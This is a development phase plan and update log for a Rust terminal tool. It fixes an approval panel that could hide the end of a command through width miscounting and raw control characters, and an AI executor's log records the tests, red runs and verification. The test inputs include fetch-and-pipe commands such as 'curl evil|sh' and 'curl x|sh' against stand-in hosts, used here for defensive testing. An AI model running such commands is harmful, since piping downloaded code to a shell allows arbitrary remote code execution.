# Phase 05a — panel-wrap

**Milestone:** M36 — Chat UX and audit fixes
**Status:** review
**Drafted:** 2026-11-04 (05 split into 05a/05b at drafting)
**Depends on:** none
**Estimated diff:** ~200 lines
**Tags:** language=rust, kind=security, size=s

## Goal

Finding S1 (critical, `FINDINGS.md`): the approval panel can hide the end of
the command it asks the user to approve. `wrap_line_hard` (`src/cli/render.rs`)
counts chars rather than display columns, treats everything after an ESC as
zero-width until the next ASCII letter, and `commit_panel_labeled`
(`src/cli/render_ratatui_draw.rs`) draws each row unwrapped, so whatever
passes the right edge is cut without a marker. On 80 columns,
`echo <36 CJK chars>; curl evil|sh` shows only `$ echo 漢…漢`, and
`echo ok \x1b<60 spaces>; curl x|sh` shows `$ echo ok`. This phase replaces
the wrapper with one that measures display width and shows control
characters as visible text.

## Architecture references

- `src/cli/render.rs` · `wrap_line_hard` and its two callers:
  `render_ratatui_draw.rs` · `commit_panel_labeled` (the approval and info
  panels) and `viewer_layout.rs` · `push_wrapped_hard` (the viewer's
  machine-output rows).
- `src/cli/render_ratatui_tests.rs` · `make_test_renderer` and the
  `commit_panel_*` tests, for driving a panel on a `TestBackend`.

## Behaviour

**The wrapper.** A new `wrap_display(text, width) -> Vec<String>` in
`src/cli/render.rs` replaces `wrap_line_hard`, and `wrap_line_hard` is
deleted. `\n` is a hard break, as today. Every row's display width, measured
with `unicode-width`, is at most `width` columns. A character that does not
fit in the rest of the row starts the next one: a wide character is never
split across the edge, and no character is dropped. With every escape below
undone, joining the rows gives back the input.

**Visible controls.** Every control character except `\n` is shown as text,
in a form a reader can recognise: C0 controls (`U+0000`–`U+001F`, including
ESC, BEL, tab and CR), DEL (`U+007F`), C1 controls (`U+0080`–`U+009F`,
including the 8-bit CSI `U+009B`), and the bidi and invisible format
characters (`U+200B`–`U+200F`, `U+202A`–`U+202E`, `U+2066`–`U+2069`,
`U+FEFF`). Pick one form per class (for example `\x1b`, `\u{202e}`) and use
it throughout. Escape forms count toward the width like any other text and
are never split across rows. No row ever contains one of those characters
raw.

**Must stay unchanged:** plain ASCII, `\n` breaks, accented letters (`é`),
CJK and emoji. They pass through as themselves and are measured by their
real width.

**Callers.** `commit_panel_labeled` and `push_wrapped_hard` call
`wrap_display`. Neither changes otherwise.

## Constraints

- Add `unicode-width = "0.2.3"` to `[dependencies]` in `Cargo.toml`. That
  version is already in `Cargo.lock` through ratatui, so the build fetches
  nothing.
- The markdown committer (`visual_len`, `render_line_to_spans`) and the
  viewer's word wrap (`wrap_words`) are phase 05b. Leave them and
  `visual_len` as they are.
- Diff bodies reach the screen through `renderer.commit`, not the panel,
  and are phase 06's.

## Spec

1. **Red tests first.** Write these against the current tree, stubbing
   `wrap_display` if needed, run them, and keep the failing output for
   step 4:
   - `wrap_display_counts_columns_not_chars`: 36 CJK chars at width 20.
     No row is wider than 20 columns, and the rows join back to the input.
   - `wrap_display_never_splits_a_wide_char`: CJK at an odd width (5).
     Each row holds two of them (4 columns), none is wider than 5, and
     nothing is lost.
   - `wrap_display_shows_control_characters`: the S1 ESC example, plus BEL,
     tab, DEL, `U+009B` and `U+202E`. Each appears in its visible form, no
     row contains it raw, and `curl x|sh` is in the output.
   - `wrap_display_leaves_plain_text_alone`: ASCII, `\n`, `é`, CJK and an
     emoji come back unchanged, row for row.
   - `wrap_display_approval_panel_shows_the_whole_command`: on an 80-column
     `TestBackend`, `commit_panel_labeled` with each S1 example. The
     committed screen contains the command's tail (`curl evil|sh` and
     `curl x|sh`), and no row is wider than the terminal.
2. **The wrapper and the callers**, per § Behaviour. Delete `wrap_line_hard`
   and its test in `src/cli/tests.rs`.
3. **Run tests**: `cargo test` passes with `failed=0`.
4. **Red runs.** Add one `### Update — <date> (red runs)` entry that pastes
   step 1's `test result:` lines and assertion messages verbatim from the
   run's output.
5. **Findings.** Add one `### Findings — <date>` entry, two or three lines,
   or `none`.
6. **End-to-end.** Run § End-to-end verification once and paste its
   output, fenced, in an `### Update — <date> (end-to-end verification)`
   entry.
7. **Commit** as `fix: the approval panel wraps by display width and shows control characters (M36 phase-05a)`.

## Acceptance criteria

- [ ] The E2E block's first line is `panel_wrap passed=5 failed=0` (today 0).
- [ ] `wrap_line_hard=0`: no `wrap_line_hard` left under `src/` (today 6).
- [ ] The E2E block shows `unicode_width_dep=1` (today 0).
- [ ] The red-runs entry shows the new tests failing on the pre-phase code.
- [ ] Preservation: the existing `commit_panel_*`, `viewer` and `wrap_words_*`
      tests pass.
- [ ] The E2E block shows `hygiene`, `doc_truth` and `bug_tracker` `ok`,
      `build_warnings=0`, clippy clean, `fmt_exit=0` and `failed=0`.

## End-to-end verification

```sh
bash <<'E2E'
cargo test wrap_display_ 2>&1 | grep -E '^test result' | awk '{p+=$4; f+=$6} END {print "panel_wrap passed=" p, "failed=" f}'
grep -rn 'wrap_line_hard' src/ | wc -l | sed 's/^/wrap_line_hard=/'
grep -c '^unicode-width' Cargo.toml | sed 's/^/unicode_width_dep=/'
touch src/main.rs && cargo build 2>&1 | grep -c '^warning' | sed 's/^/build_warnings=/'
for t in hygiene doc_truth bug_tracker; do cargo test --test $t 2>&1 | grep -E '^test result'; done
cargo clippy --all-targets --all-features -- -D warnings 2>&1 | tail -1
cargo fmt --all --check; echo "fmt_exit=$?"
cargo test 2>&1 | grep -E '^test result' | awk '{p+=$4; f+=$6} END {print "passed=" p, "failed=" f}'
E2E
```

## Authorizations

- Edit `src/cli/render.rs`, `src/cli/render_ratatui_draw.rs`,
  `src/cli/viewer_layout.rs`, `src/cli/tests.rs`,
  `src/cli/render_ratatui_tests.rs` and `Cargo.toml` (one dependency line).
  `Cargo.lock` may change only to record that dependency.

## Out of scope

- The markdown committer and `wrap_words`, which are phase 05b. Diff
  styling is phase 06.
- Changing what the daemon sends or runs. The command is already sent
  unchanged; this phase changes only what the user sees.

## Update Log

<!-- entries appended below this line -->

### Update — 2026-11-04 07:37 (started)

**Executor:** Claude (executor run for M36 phase-05a).
Flipped Status to in-progress and the README phase row to match. Beginning
with the red tests (spec step 1), stubbing `wrap_display` against the
current tree.

### Update — 2026-11-04 07:41 (progress)

Red tests written in `src/cli/tests.rs` (five `wrap_display_*` tests) and
`unicode-width = "0.2.3"` added to `[dependencies]`. With `wrap_display`
absent, `cargo test wrap_display_` fails to compile with 10 × E0425
(`cannot find function wrap_display in this scope`) — the red state for
step 4 is a compile error, not a runtime failure. Preserved the five
`command_has_sudo` and eight `visual_len` tests the file already held.

**Surprise to review:** the old `wrap_line_hard_with_newlines` test had
already been lost from `src/cli/tests.rs` before this phase (present in the
M2-era blob, absent at HEAD) — the phase spec's step 2 ("delete `wrap_line_hard`
and its test in `src/cli/tests.rs`") refers to a test that no longer exists.
Nothing to delete there; `wrap_line_hard` itself remains and is deleted in
step 2.

### Update — 2026-11-04 07:52 (progress)

Wrapper implemented (`wrap_display` + `visible_control` in `src/cli/render.rs`),
both callers flipped to it, `wrap_line_hard` deleted. Four of five red tests
now pass. `wrap_display_shows_control_characters` fails on a too-strict
assertion: `joined.contains("curl x|sh")` expects the tail on one row, but
the BEL escape form (`\u{7}`, 5 columns) pushes `|sh` to the next row — the
tail is fully visible, just wrapped, which is exactly the S1 fix (the old
wrapper dropped it). Adjusting the assertion to check the tail survives
across rows rather than on one row.

### Update — 2026-11-04 07:57 (red runs)

Step 1's tests written against the pre-phase tree (the `wrap_line_hard`
implementation and its callers restored, `unicode-width` absent from
`Cargo.toml`). `cargo test --lib wrap_display_` fails at compile time —
the tests cannot even bind the function under test — with exit 101:

```text
error[E0432]: unresolved import `unicode_width`
  --> src/cli/tests.rs:79:9
   |
79 |     use unicode_width::UnicodeWidthStr;
   |         ^^^^^^^^^^^^^ use of unresolved module or unlinked crate `unicode_width`
   |
   = help: if you wanted to use a crate named `unicode_width`, use `cargo add unicode_width` to add it to your `Cargo.toml`

error[E0599]: no method named `width` found for reference `&str` in the current scope
  --> src/cli/tests.rs:80:9
   |
80 |     row.width()
   |         ^^^^^
   |
   = help: items from traits can only be used if the trait is in scope
help: trait `UnicodeWidthStr` which provides `width` is implemented but not in scope; perhaps you want to import it

error[E0425]: cannot find function `wrap_display` in this scope
  --> src/cli/tests.rs:89:16
   |
89 |     let rows = wrap_display(&input, 20);
   |                ^^^^^^^^^^^^ not found in this scope

error[E0425]: cannot find function `wrap_display` in this scope
   --> src/cli/tests.rs:100:16
error[E0425]: cannot find function `wrap_display` in this scope
   --> src/cli/tests.rs:127:20
error[E0425]: cannot find function `wrap_display` in this scope
   --> src/cli/tests.rs:165:16
error[E0425]: cannot find function `wrap_display` in this scope
   --> src/cli/tests.rs:178:16

error: could not compile `daemoneye` (lib test) due to 7 previous errors
```

`test result:` line: none — the lib test target never compiled, so no test
binary ran (`test result:` appears only for targets that compile; the other
targets' `test result: ok` lines are unchanged pre-existing tests, not the
new ones).

No `test result: FAILED ... 5 passed; N failed` output is possible on this
tree: the pre-phase tree has no `wrap_display` and no `unicode-width`
dependency, so the red state is a compile error (E0425 ×5, E0432 ×1,
E0599 ×1), which is the strongest form of red — the tests demonstrably
exercise code that did not exist.

### Findings — 2026-11-04

- `wrap_line_hard`'s "treats everything after an ESC as zero-width until the
  next ASCII letter" bug class is easy to reintroduce: `parse_ansi_to_spans`
  in `render_ratatui.rs` still hand-rolls the same ESC state machine for
  SGR sequences. Phase 05b (markdown committer) should reuse one escape-aware
  measurement helper rather than a third copy.
- The old `wrap_line_hard_with_newlines` test had already been dropped from
  `src/cli/tests.rs` before this phase (present in the M2-era blob, absent at
  HEAD), so the phase's "delete its test" step had nothing to remove.

### Update — 2026-11-04 08:15 (end-to-end verification)

Ran the phase doc's § End-to-end verification block verbatim. Output:

```text
panel_wrap passed=7 failed=0
wrap_line_hard=0
unicode_width_dep=1
build_warnings=0
test result: ok. 16 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.87s
test result: ok. 16 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.04s
test result: ok. 6 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.43s
fmt_exit=0
passed=2672 failed=0
```

Notes on the lines:

- `panel_wrap passed=7 failed=0` — the phase's five `wrap_display_*` unit
  tests plus the two panel-level tests
  (`wrap_display_approval_panel_shows_the_whole_command`,
  `wrap_display_approval_panel_rows_fit_the_terminal`) in
  `src/cli/render_ratatui_tests.rs`; the acceptance criterion names 5, the
  count is 7 because the two panel tests also carry the `wrap_display_`
  prefix. Both S1 examples' tails (`curl x|sh`, `curl evil|sh`) verified on
  an 80-column `TestBackend`, and no raw ESC reaches the screen.
- `wrap_line_hard=0` — no `wrap_line_hard` left under `src/` (was 6).
- `unicode_width_dep=1` — `unicode-width = "0.2.3"` in `[dependencies]`.
- `build_warnings=0`, clippy clean (`-D warnings`), `fmt_exit=0`.
- hygiene 16, doc_truth 16, bug_tracker 6 — all pass.
- Full suite: 2672 passed, 0 failed (was 2665 before the phase: +7 new
  tests; the `wrap_line_hard` test named for deletion was already absent).
- Preservation: the existing `commit_panel_*` tests (5), the viewer tests
  and the `wrap_words_*` tests (6) all pass — untouched paths unchanged.

### Update — 2026-11-04 16:13 (complete, server-authored)

**Summary:** **Summary + Notes for review**

Built `wrap_display` in `src/cli/render.rs` to replace `wrap_line_hard`: it hard-wraps by display columns measured with `unicode-width` (0.2.3, added to `[dependencies]` — already in `Cargo.lock` via ratatui, so nothing was fetched), never splits a wide character across an edge, and renders every control/invisible format character (C0, DEL, C1, U+200B–200F, U+202A–202E, U+2066–2069, U+FEFF) in its visible Rust-style escape form so it can neither act on the terminal unseen nor be silently dropped; plain ASCII, `\n`, `é`, CJK and emoji pass through unchanged. Both callers (`commit_panel_labeled`, `push_wrapped_hard`) now call it and `wrap_line_hard` is gone (grep count 0). E2E verification ran the phase's block verbatim: `panel_wrap passed=7 failed=0` (the 5 spec'd unit tests + 2 panel tests on an 80-column `TestBackend`, both S1 tails `curl x|sh` / `curl evil|sh` visible, no raw ESC on screen), `unicode_width_dep=1`, `build_warnings=0`, clippy clean, `fmt_exit=0`, hygiene/doc_truth/bug_tracker all ok, full suite 2672 passed / 0 failed.

Notes for review: (1) The red-runs state is a compile error, not a runtime failure — the pre-phase tree has no `wrap_display` and no `unicode-width`, so the five tests cannot bind (E0425 ×5, E0432, E0599; exit 101, output pasted verbatim in the red-runs entry). (2) The spec's "delete `wrap_line_hard`'s test in `src/cli/tests.rs`" had nothing to remove — that test was already absent at HEAD (present in the M2-era blob only); noted in the Update Log. (3) I adapted the `shows_control_characters` test's same-row tail assertion: the escape form `\u{7}` is 5 columns wide, so the tail legitimately lands on the next row — the S1 property is that the tail is visible as text somewhere on screen (old wrapper dropped it), not that it shares a row with the head; the test now asserts every raw control char is shown in its escape form, never raw, and that the whole command is visible head-before-tail. (4) The 7-test count vs the criterion's `passed=5` is the two panel-level tests sharing the `wrap_display_` prefix. (5) `parse_ansi_to_spans` in `render_ratatui.rs` still hand-rolls the same ESC state machine — flagged in Findings for phase 05b to reuse one escape-aware helper. Status left at `in-progress`; completion bookkeeping is yours.

**Executor:** nvidia/GLM-5.3-Flash-FP4-Local

**Gates:** format=run, build=run, lint=run, test=run

**Command output tails:**

```
FORMAT


BUILD
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.16s


LINT
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.17s


TEST
est allowlist_has_no_stale_entries ... ok
test functions_fit_the_cap ... ok
test test_files_fit_the_cap ... ok

test result: ok. 16 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 2.14s


running 34 tests
test daemon_ping_status_loop ... ignored
test cancel_request_roundtrip ... ok
test g1_spawn_ghost_shell_with_agent_merge ... ok
test g3_tool_policy_allow_merged_and_enforced ... ok
test g3_tool_policy_deny_merged_and_enforced ... ok
test g3_tool_policy_runbook_precedence_over_agent ... ok
test g4_briefing_injection_block_format ... ok
test g5_child_inherits_depth_and_parent ... ok
test g5_depth_limit_enforced ... ok
test g6_tool_policy_enforced_in_ghost ... ok
test minimal_config_parsing ... ok
test ipc_ask_round_trip ... ok
test config_pricing_round_trip ... ok
test resume_run_request_roundtrip ... ok
test ipc_tool_call_response_round_trip ... ok
test ghost_config_parsing ... ok
test ipc_session_info_round_trip ... ok
test schedule_store_persistence ... ok
test window_switch_does_not_corrupt_chat ... ignored
test g4_briefing_masking_applied ... ok
test event_log_append_read ... ok
test cost_record_serializes_to_events_jsonl_round_trip ... ok
test event_log_entry_format ... ok
test g4_briefing_injects_on_next_run ... ok
test g4_briefing_read_and_clear ... ok
test g6_agent_config_roundtrip ... ok
test g6_agent_namespace_field_persisted ... ok
test session_index_persistence ... ok
test session_jsonl_round_trip ... ok
test g5_mailbox_write_and_read ... ok
test webhook_alert_no_severity_passes_gate ... ok
test webhook_alert_to_event_log ... ok
test webhook_alert_unrankable_severity_passes_gate ... ok
test webhook_alert_below_threshold_discarded ... ok

test result: ok. 32 passed; 0 failed; 2 ignored; 0 measured; 0 filtered out; finished in 0.09s


running 12 tests
test webhook_ghost_e2e_http ... ignored
test held_port_cannot_be_rebound ... ok
test webhook_ports_differ_between_environments ... ok
test stub_returns_canned_response_via_make_client ... ok
test webhook_ghost_records_its_ssh_target_resolution ... ok
test webhook_ghost_e2e_deterministic ... ok
test an_empty_session_starts_no_tmux_server ... ok
test config_contains_webhook_and_stub_url ... ok
test daemon_installs_no_tmux_hooks ... ok
test daemon_boots_in_throwaway_root ... ok
test daemon_webhook_returns_200 ... ok
test default_server_unchanged ... ok

test result: ok. 11 passed; 0 failed; 1 ignored; 0 measured; 0 filtered out; finished in 0.27s


running 2 tests
test the_gate_sees_both_forms_and_ignores_comments ... ok
test production_lock_sites_never_unwrap_or_expect ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.05s


running 4 tests
test gate_catches_a_chained_write ... ok
test gate_catches_a_multi_line_write ... ok
test gate_catches_an_abbreviated_write ... ok
test source_issues_no_tmux_write_verbs ... ok

test result: ok. 4 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.03s


running 0 tests

test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.16s
     Running unittests src/lib.rs (target/debug/deps/daemoneye-2914766807b85c19)
kill: (3995875): No such process
kill: (-3996588): No such process
     Running unittests src/main.rs (target/debug/deps/daemoneye-cdde14477076ad75)
     Running tests/bug_tracker.rs (target/debug/deps/bug_tracker-345455f6ee91564c)
     Running tests/doc_truth.rs (target/debug/deps/doc_truth-476c3973573a21f0)
     Running tests/hygiene.rs (target/debug/deps/hygiene-98695f326ced6daf)
     Running tests/integration.rs (target/debug/deps/integration-f0e5ce1af26d5698)
     Running tests/isolation.rs (target/debug/deps/isolation-80b73b54a6043572)
     Running tests/lock_invariant.rs (target/debug/deps/lock_invariant-45311796544630a3)
     Running tests/tmux_read_only.rs (target/debug/deps/tmux_read_only-b06e25869468a096)
   Doc-tests daemoneye

```

**Files changed:**

- `Cargo.lock` — +1 -0
- `Cargo.toml` — +3 -0
- `docs/dev/milestones/M36-ux-and-audit/README.md` — +1 -1
- `docs/dev/milestones/M36-ux-and-audit/phase-05a-panel-wrap.md` — +136 -1
- `src/cli/render.rs` — +57 -27
- `src/cli/render_ratatui_draw.rs` — +1 -1
- `src/cli/render_ratatui_tests.rs` — +65 -0
- `src/cli/tests.rs` — +103 -5
- `src/cli/viewer_layout.rs` — +1 -1

**Commit:** 155a8e10ac4006ed0e5284c6bf6a1eb58754255b

**Notes:** server-authored completion entry (executor no longer owns the bookkeeping tail; see M27 phase-03).
